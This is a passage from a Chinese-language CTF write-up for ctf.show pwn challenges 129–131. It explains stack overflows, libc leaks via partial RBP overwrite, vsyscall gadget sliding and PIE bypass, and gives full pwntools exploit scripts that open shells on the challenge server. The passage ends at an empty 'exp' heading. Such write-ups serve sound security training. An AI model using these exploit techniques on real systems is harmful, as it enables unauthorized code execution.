class="line">  &#125;</span><br><span class="line">  return puts(&quot;Loser~ Loser~ Loser~ Loser~ Loser~&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序主要还是选第一个功能，跟进对应函数查看：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OTE2ZGY2MmY4Y2NlNTc5YzcxZjEyOTFjODhkMDY2YzBfc1lVUjE3STlwVnVCbGtOaFJoMmV6UU80Y3hHN1dxVURfVG9rZW46R1ZpUmIwTEZ1b3lib0l4QkJIZmNmMVd5bnNjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>继续跟进sub_E43():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NzRiNTFkNGUyOTAzMGMxNTRjOWQzMmEwMWM3YzZhZGRfRjUzTm5BV2ZvcHZjRWpNQ1VDSWJwWWxVZzVnRGRuVlNfVG9rZW46UHQxVmJvbGRQb1Npb254dGRnYmNOelZpbjVlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>read会读入0x400个字符到栈上，而对应的局部变量buf显然没那么大，因此会造成栈溢出。</p>
<p>由于使用了PIE，而且题目中虽然有system但是没有后门，所以本题没办法使用partial write劫持RIP。</p>
<p>在进行调试时发现了栈上有大量指向libc的地址。</p>
<p>查看一下汇编代码：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=M2JlZDU3OWM3YjQ4M2I4NzAwODIwMTBjMGM1ZjY1MThfRzdmYXR2RTFGYUhWSXRwUWNjclhJcWJHeWVCVzdsSTdfVG9rZW46VllZRmJXMExGbzFUR2l4TjNLMGNzdDZNbmVkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>可以发现printf输出的参数位于栈上，通过rbp定位。</p>
<p>利用这两个信息，我们很容易想到可以通过partial overwrite修改RBP的值指向这块内存，从而泄露出这些地址，利用这些地址和libc就可以计算到one gadget RCE的地址从而栈溢出调用。我们把RBP的最后两个十六进制数改成0x5c，此时[rbp+var_34] &#x3D; 0x5c-0x34&#x3D;0x28，泄露位于这个位置的地址。但是成功率有限，有时候能泄露出libc中的地址，有时候是start的首地址，有时候是无意义的数据，甚至会直接出错，原因是[rbp+var_34]中的数据是0，idiv除法指令产生了除零错误。</p>
<p>此外，我们观察泄露出来的addr_l8会发现有时候是正数有时候是负数。这是因为我们只能泄露出地址的低32位，低8个十六进制数。而这个数的最高位可能是0或者1，转换成有符号整数就可能是正负两种情况。</p>
<p>由于我们泄露出来的只是地址的低32位，抛去前面的4个0，我们还需要猜16位，即4个十六进制数，这种方式的爆破区间有点大，成功几率较低，需要对各种条件进行限制才能提升几率。</p>
<p>经过调试，发现程序加载地址都为0x000055XXXXXXXXXX-0x000056XXXXXXXXXX</p>
<p>libc的地址都为0x7fXXXXXXXXXX</p>
<p>已知8个16进制数，剩下两个随便填一下如：2a</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        py_add = <span class="number">0</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        <span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28201</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Choice:\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;doubts?\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;more?\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">        a1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        io.recvuntil(<span class="string">&quot;* &quot;</span>)</span><br><span class="line">        a2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        a3 = <span class="built_in">str</span>(a1*a2)</span><br><span class="line">        a4 = a3.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&#x27;\x6c&#x27;</span></span><br><span class="line">        io.sendafter(<span class="string">&quot;Answer:&quot;</span>,a4)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;doubt &quot;</span>)</span><br><span class="line">        answer = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> answer &lt; <span class="number">0</span>:</span><br><span class="line">            answer = answer + <span class="number">0x100000000</span> <span class="comment"># 由于answer这个数的二进制最高位有可能是0或1，所以可能位有符号数（0），要处理</span></span><br><span class="line">        answer_end = answer + <span class="number">0x7f2a00000000</span> <span class="comment"># 通过ELF(libc文件).symbols[&#x27;函数名&#x27;]查找地址</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(answer_end)[-<span class="number">2</span>:] == <span class="string">&#x27;6f&#x27;</span>:     <span class="comment"># _IO_file_write+8F  e0+8f=16f</span></span><br><span class="line">            py_add = answer_end - <span class="number">0xf88e0</span> - <span class="number">0x8f</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hex</span>(answer_end)[-<span class="number">2</span>:] == <span class="string">&#x27;00&#x27;</span>: <span class="comment">#_IO_2_1_stdout</span></span><br><span class="line">            py_add = answer_end - <span class="number">0x3c2600</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hex</span>(answer_end)[-<span class="number">2</span>:] == <span class="string">&#x27;83&#x27;</span>: <span class="comment">#_IO_2_1_stdout_+83  00+83=83</span></span><br><span class="line">            py_add = answer_end - <span class="number">0x3c2600</span> - <span class="number">0x83</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hex</span>(answer_end)[-<span class="number">2</span>:] == <span class="string">&#x27;59&#x27;</span>: <span class="comment">#_IO_do_write+79  e0+79=159</span></span><br><span class="line">            py_add = answer_end -<span class="number">0xf88e0</span> - <span class="number">0x79</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hex</span>(answer_end)[-<span class="number">2</span>:] == <span class="string">&#x27;20&#x27;</span>: <span class="comment">#_IO_file_overflow</span></span><br><span class="line">            py_add = answer_end - <span class="number">0x7c820</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hex</span>(answer_end)[-<span class="number">2</span>:] == <span class="string">&#x27;8a&#x27;</span>: <span class="comment">#puts+16a  20+6a=8a</span></span><br><span class="line">            py_add = answer_end - <span class="number">0x70920</span> - <span class="number">0x16a</span></span><br><span class="line">        one_gadget = py_add + <span class="number">0x45216</span></span><br><span class="line">        <span class="keyword">if</span> py_add == <span class="number">0</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">        a1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        io.recvuntil(<span class="string">&quot;* &quot;</span>)</span><br><span class="line">        a2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        a3 = <span class="built_in">str</span>(a1*a2)</span><br><span class="line">        a4 = a3.ljust(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)+ p64(one_gadget)</span><br><span class="line">        io.sendafter(<span class="string">&quot;Answer:&quot;</span>,a4)</span><br><span class="line">        io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这里提示了远程环境为Ubuntu 16.04，我们大致就能知道了libc的版本</p>
<p>前面99次使得程序返回1，使得最后一次能进行栈溢出劫持rip,执行vsyscall，ret到one_gadget实现getshell</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28161</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line">vsyscall_add = <span class="number">0xffffffffff600000</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Choice:\n&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Choice:\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;doubts?\n&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;more?\n&quot;</span>,<span class="string">&#x27;-378&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">    answer1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    io.recvuntil(<span class="string">&quot;* &quot;</span>)</span><br><span class="line">    answer2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Answer:&quot;</span>,<span class="built_in">str</span>(answer1*answer2))</span><br><span class="line">    </span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>* <span class="number">0x8</span></span><br><span class="line">payload += p64(vsyscall_add) * <span class="number">3</span></span><br><span class="line">io.sendafter(<span class="string">&quot;Answer:&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn-130"><a href="#pwn-130" class="headerlink" title="pwn 130"></a>pwn 130</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDA1OWUxZjUzYTk2YzM4MmNiN2RhMjdkODdhMDBkYmVfR09DRnZvV0FBTXh2NDZyT3JnQ1R5OEFZOVlPanNaVzdfVG9rZW46U3FGZGJWSXdCb0JEajV4cjVmcGNRUDR5bkFkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位开启NX，开启了PIE，部分开启RELRO</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2RlYWEzZWNjYTNhZmM2NzJjZDQ5MzdmYjZjMDFmMjRfZWg2MTExbURDODN1bVZkdDdOZDVoYkxVM1E1dW02dUtfVG9rZW46TG91VWJZMkEwb2gwSlV4RVpzT2NJTU1tbjdlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>这次再来看到hint()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NmJlMmI3OTY1NWMxMTViN2VhNTBlM2NkZTBjNWVhMGJfSElHRmRNUWlYWG5wUjJKWGtqbnNzT0dlb0ZRR0tsS21fVG9rZW46RXNDY2JrYURCb1JnREp4bWRMa2NXenhublZnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>发现当全局变量show_hint非空时输出system的地址。由于缺乏任意修改地址的手段，并不能去修改show_hint，但是分析汇编代码，可以发现不管show_hint是否为空，其实system的地址都会被放置在栈上。</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=M2E2NTRkMzZmNGEwYTYyZmM3YTBmYmY2YzM0MzQ4YTdfZE1aMzRobWZQNnhSdmQwenptTXJpSU01UExpZmp6WkhfVG9rZW46T3J4TGJMRmlLb1JMT294bzdIV2MzczhJbkxkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>继续查看函数主功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many doubts?&quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Loser~&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;More doubts than before!&quot;</span>);</span><br><span class="line">      v6 = <span class="number">1000LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go! &quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)doubt(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d doubts in %d seconds\n&quot;</span>, v6, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - v2));</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Loser~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OWEzZmM4OWJkM2M4Y2NkYWNjMzIzZWJjMmNiMGI0ZWNfTWRMcnlkTXphV05VVDJURXJHTjJuVTBIVHpob09TOVhfVG9rZW46QTJLWWJrWGUyb2hzRjZ4c2Z3S2NDQmFEbjljXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>分析功能函数可以发现，当输入的关卡数为正数的时候，<code>rbp+var_110</code>处的内容会被关卡数取代，而输入负数时则不会，而这里的<code>rbp + var_110</code>也即是system存放在栈上的地址，根据栈帧开辟的原理和main函数代码的分析，由于两次循环之间并没有进出栈操作，main函数的rsp，也就是hint和go的rbp应该是不会改变的,即两个函数进入时<code>push rbp</code>操作的rbp值是一样的。 调试也可以发现确实如此，因为程序会将两次输入的关卡数相加，第一次输入负数，让system的地址加载到第一次输入关卡数处，第二次输入一个偏移量时就可以使<code>rbp + var_110</code>处原本system的地址变为<code>one gadget</code>的地址，从而通过后面的答题函数构造溢出劫持RIP到这个地址拿到shell。 由于rbp_var_110里的值会被当成循环次数，当次数过大时会锁定为999次，所以我们必须写一个自动应答脚本来处理题目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">auto_answer</span>(<span class="params">io, level, last_answer</span>):</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> xrange(<span class="number">0</span>, level):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">        temp = io.recvuntil(<span class="string">&quot;= ?&quot;</span>).strip(<span class="string">&quot;= ?&quot;</span>).strip().split(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Answer:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index == level -<span class="number">1</span> :</span><br><span class="line">            io.send(last_answer)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.send(<span class="built_in">str</span>(<span class="built_in">int</span>(temp[<span class="number">0</span>]) * <span class="built_in">int</span>(temp[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure>

<p>计算发现0x38个字节后到rip，然而rip离<code>one gadget</code>还有三个地址长度</p>
<p>vsyscall中有三个无参系统调用，且只能从入口进入。我们选的这个one gadget要求rax &#x3D; 0，gettimeofday执行成功时返回值就是0，因此我们可以选择调用三次vsyscall中的gettimeofday，利用执行完的ret“滑”过这片空间。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28166</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4526a</span>     </span><br><span class="line"></span><br><span class="line">image_base = <span class="number">0x555555554000</span>    </span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vsyscall_address = <span class="number">0xffffffffff600400</span>   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_choice</span>(<span class="params">io, choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_level</span>(<span class="params">io, level1, level2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;How many doubts?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(level1))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Any more?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(level2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auto_answer</span>(<span class="params">io, level, last_answer</span>):</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> xrange(<span class="number">0</span>, level):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">        temp = io.recvuntil(<span class="string">&quot;= ?&quot;</span>).strip(<span class="string">&quot;= ?&quot;</span>).strip().split(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Answer:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index == level -<span class="number">1</span> :</span><br><span class="line">            io.send(last_answer)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.send(<span class="built_in">str</span>(<span class="built_in">int</span>(temp[<span class="number">0</span>]) * <span class="built_in">int</span>(temp[<span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line">input_choice(io, <span class="number">2</span>)</span><br><span class="line">input_choice(io, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">first_level = -<span class="number">1</span></span><br><span class="line">second_level = one_gadget - system_offset</span><br><span class="line">input_level(io, first_level, second_level)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p64(vsyscall_address) * <span class="number">3</span></span><br><span class="line">auto_answer(io, <span class="number">1000</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn-131"><a href="#pwn-131" class="headerlink" title="pwn 131"></a>pwn 131</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTMyZDAwOTc5NGM3ODEwYjE0ODBjZjY3NjYyMDIwNzRfeDdWQWxQblgxRWZYanMwd3VYbmpNSTVqT1pzMlBLdTVfVG9rZW46Tno2UGJSd0s3b3FnbjR4UWE3N2MxbTFNbnBkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>32位程序仅关闭Canary</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MDZmMzNkMTViYTIyOWU5MWVhYWZiODYyMDgzYjhlNjFfQWZHUzZZOW11dG8wdzhlMzM3Q3lxbTZIZkZNU21RbldfVG9rZW46R1N1U2I0VUZjb2RXU0V4UWZDRWN4c1RiblZiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>发现程序输出了main函数的地址</p>
<p>跟进ctfshow函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=N2E0YmI2MDBkZjA5NDk1MTcyZGQxNzlhZTQ1OWNlNTJfOHVxUVZYUHhhVjQwRlU0T3JmbE9tRzM4aXZaam9PaXNfVG9rZW46UzIzU2JQT0JJb0J1Y2x4dWRrdWNLRkU4bllmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>明显的栈溢出漏洞</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ODM1MTg0NDI0NTUwYTYyYTI3ODhmNDNiNTgwNmVlODhfajZqangzMHhVdVM5T1JWMHBLdEFzSmhaUEZGdmRIejRfVG9rZW46UExCdGJ0ZndDb2xvQTZ4c1hkeWNlYUljbmliXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>接着看：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NDdjNDg4N2MxMzJlMjUwMWM1NmE5YzNhYjhkOWI1Nzlfb0VJMUU0M3dRVHlwMUx0ZzRJVjE0b3FJUUNRTFQ2d2FfVG9rZW46VnpFSGJjdnJNb0IyRkR4UkpFS2NtelQzbjdlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWI0MjNmNzI2ZWUxZjBmNzI0Zjg2MjI5NjFkNDE4MjNfZWNvRkhEUWhsdTF0R2xsOUY0am52ZmVYZGtvZXBsVnpfVG9rZW46Vm9GTGJBdzR2b2kwTnB4UEFKUGNKeXlybnFjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>与之前的不同，它不再对程序的原始字节码做修改，而是使用一类__x86.get_pc_thunk.xx函数，通过PC指针来进行定位</p>
<p>__x86.get_pc_thunk.bx的作用将下一条指令的地址赋值给ebx寄存器，然后通过加上一个偏移，得到当前进程GOT表的地址，并以此作为后续操作的基地址</p>
<p>ebx &#x3D; 0x7ae + 0x2812 &#x3D; 0x2fc0</p>
<p>程序在运行时，这个基地址就是程序第三部分的起始位置</p>
<p>由于在函数末尾有恢复ebx寄存器的行为，因此需要在溢出时需要将GOT地址也覆盖上去，至此就完成了ASLR和PIE的绕过。</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmQ4YTA2MjE3YWFhOWFkYmVhOTcyOWE1YjZkNjBkZjBfNzhXV3BiTTJhMGxCc1ZnRXhhS2hwTHNUalhkRDE3cGtfVG9rZW46QTlMR2JSbEZkb3oxcm54dXJWR2M0OGVHbjRlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>exp</p>
